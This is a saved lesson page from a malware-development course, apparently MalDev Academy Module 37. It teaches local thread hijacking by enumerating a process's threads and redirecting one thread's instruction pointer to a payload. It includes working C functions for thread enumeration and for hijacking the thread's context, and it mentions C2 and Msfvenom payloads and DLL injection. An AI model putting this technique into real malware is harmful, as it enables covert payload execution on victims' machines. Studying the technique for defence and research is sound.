<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">
        <link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/template.css">
        <link rel="shortcut icon" href="#favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/css2.css" rel="stylesheet">
        <link href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/css2_002.css" rel="stylesheet">
        <title>Thread Hijacking - Local Thread Enumeration</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/app.fdbb573b.css"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/app.fdbb573b.css"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="#" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="#" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="#faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="#syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="#pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="#profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="#logout" method="POST">
            <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="#modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 37 - Thread Hijacking - Local Thread Enumeration
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="#download/file/LocalThreadEnumHijacking" target="_blank">
                    <img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Thread Hijacking - Local Thread Enumeration</h2>
<h3>Introduction</h3>
<p>So far, when local thread hijacking was performed, the target thread was created using <code>CreateThread</code>
 and its context was modified. This module will demonstrate an 
alternative method where the system's running threads are enumerated 
using <code>CreateToolhelp32Snapshot</code> and then hijacked.</p>
<h3>Thread Enumeration</h3>
<p>Recall the use of <code>CreateToolhelp32Snapshot</code> from previous
 modules, where the WinAPI was used to retrieve a snapshot of the 
system's processes. In this module, the same WinAPI is being but with a 
different value being used for the <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters" target="_blank">dwFlags Parameter</a>. To enumerate the running threads on the system, the <code>TH32CS_SNAPTHREAD</code> flag must be specified. Using this flag, <code>CreateToolhelp32Snapshot</code> returns a <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32" target="_blank">THREADENTRY32</a> structure that's shown below.</p>
<pre><code>typedef struct tagTHREADENTRY32 {
  DWORD dwSize;                       // sizeof(THREADENTRY32)
  DWORD cntUsage;
  DWORD th32ThreadID;                 // Thread ID
  DWORD th32OwnerProcessID;           // The PID of the process that created the thread.
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32;
</code></pre>
<p>Each running thread has its own <code>THREADENTRY32</code> structure in the captured snapshot.</p>
<h4>Identifying The Thread's Owner</h4>
<p>According to Microsoft's documentation:</p>
<p><em>To identify the threads that belong to a specific process, compare its process identifier to the <code>th32OwnerProcessID</code> member of the <code>THREADENTRY32</code> structure when enumerating the threads.</em></p>
<p>In other words, to determine the process to which the thread belongs, compare the target PID to <code>THREADENTRY32.th32OwnerProcessID</code>,
 which is the PID of the process that created the thread. If the PIDs 
match, then the thread presently being enumerated belongs to the target 
process.</p>
<h4>Required WinAPIs</h4>
<p>The following WinAPIs will be used to perform thread enumeration.</p>
<ul>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" target="_blank">CreateToolhelp32Snapshot</a> - Used with the <code>TH32CS_SNAPTHREAD</code> flag to receive a snapshot of all the threads running on the system.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first" target="_blank">Thread32First</a> - Used to get the information about the first thread captured in the snapshot.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next" target="_blank">Thread32Next</a>, Used to get the information about the next thread in the captured snapshot.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread" target="_blank">OpenThread</a> - Used to open a handle to the target thread using its thread ID.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid" target="_blank">GetCurrentProcessId</a>
 - Used to retrieve the local process's PID. Since the local process is 
the target process, its PID is required to determine whether the threads
 belong to this process.</p>
</li>
</ul>
<h3>Worker Threads</h3>
<p>Before diving into the thread enumeration code, it's important to understand the concept of <em>worker threads</em>. Although <code>CreateThread</code>
 is not used in the code, the Windows operating system will create 
worker threads in the process. These worker threads are valid targets 
for thread hijacking. An example of these worker threads can be seen 
below.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/tenum-0209185998-74b97dca-e541-401d-b700-b45852e7564a.png" alt="image"></p>
<p>The threads that are shown in the image above, such as <code>ntdll.dll!EtwNotificationRegister+0x2d0</code>, are created by the operating system to run the <code>EtwNotificationRegister</code> function, which is related to the <em>ETW - Event Tracing for Windows</em>.
 ETW will be explained in future modules but for now, it is sufficient 
to understand that this function is used to notify the operating system 
when a certain event occurs in the process.</p>
<h3>Thread Enumeration Function</h3>
<p><code>GetLocalThreadHandle</code> utilizes the previously mentioned steps to perform thread enumeration. It takes 3 arguments:</p>
<ul>
<li>
<p><code>dwMainThreadId</code> - The thread ID of the main thread of the local process. This is required to avoid targeting the local process's main thread.</p>
</li>
<li>
<p><code>dwThreadId</code> - A pointer to a DWORD that receives a hijackable thread's ID.</p>
</li>
<li>
<p><code>hThread</code> - A pointer to a HANDLE that receives a handle to the hijackable thread.</p>
</li>
</ul>
<pre><code>BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
	
	// Getting the local process ID
	DWORD           dwProcessId  = GetCurrentProcessId();
	HANDLE          hSnapShot    = NULL;
	THREADENTRY32   Thr          = {
		.dwSize = sizeof(THREADENTRY32)
	};

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &amp;Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		// The 'Thr.th32ThreadID != dwMainThreadId' is to avoid targeting the main thread of our local process
		if (Thr.th32OwnerProcessID == dwProcessId &amp;&amp; Thr.th32ThreadID != dwMainThreadId) {

			// Opening a handle to the thread 
			*dwThreadId  = Thr.th32ThreadID;
			*hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

	// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &amp;Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}

</code></pre>
<h3>Local Thread Hijacking Function</h3>
<p>Once a valid handle to the target thread has been obtained, it can be passed to the <code>HijackThread</code> function. The <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread" target="_blank">SuspendThread</a> WinAPI will be used to suspend the thread and then <code>GetThreadContext</code> and <code>SetThreadContext</code> will be used to update the <code>RIP</code>
 register to point to the payload's base address. Additionally, the 
payload must be written to the local process memory before hijacking the
 thread.</p>
<pre><code>
BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press &lt;Enter&gt; To Run ... ");
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}
</code></pre>
<h3>Demo</h3>
<p>Note that the payload execution may take some time as the hijacked thread is not the main thread and does not run continuously.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/tenum-109188468-94e7741b-8953-4079-8a7c-8ab3cc449779.png" alt="image"></p>
<br>
<p>Additionally, depending on the payload, the local process may crash 
after execution. For example, if the payload is for a command and 
control server, the process will continue running, however, if 
Msfvenom's calc shellcode was used, the process will crash because 
Msfvenom's calc shellcode terminates the calling thread.</p>
<p><img src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/tenum-209188936-9a4de3fe-fd13-4a25-b343-153a59ea894b.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Recreate this module's code into a DLL file</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use Process Hacker to inject the DLL into a target process by right-clicking on the process &gt; Miscellaneous &gt; Inject DLL</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="#modules/36"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="#modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="#modules/37/complete" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="#modules/37/progress" method="POST">
                <input type="hidden" name="_token" value="aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="#modules/38"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="#" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="/" target="_blank">
#      </a></span><a class="text-gray-400 text-sm" href="/" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="/" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="/" target="_blank">        

        <script src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/jquery-3.6.0.min.js"></script>
        <script src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/app.4474f4d1.css"><link rel="modulepreload" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/app.5f3af5ce.js"><link rel="stylesheet" href="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/app.4474f4d1.css"><script type="module" src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/app.5f3af5ce.js"></script><script src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/navbar.js"></script>
<script src="Thread%20Hijacking%20-%20Local%20Thread%20Enumeration_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 37;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "#complete/objective" : "#remove/objective",
        type: "POST",
        data: {
        _token: "aHzsquahomm2Bo0anbhiCgbZ1siEurCTfma8L6Pk",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>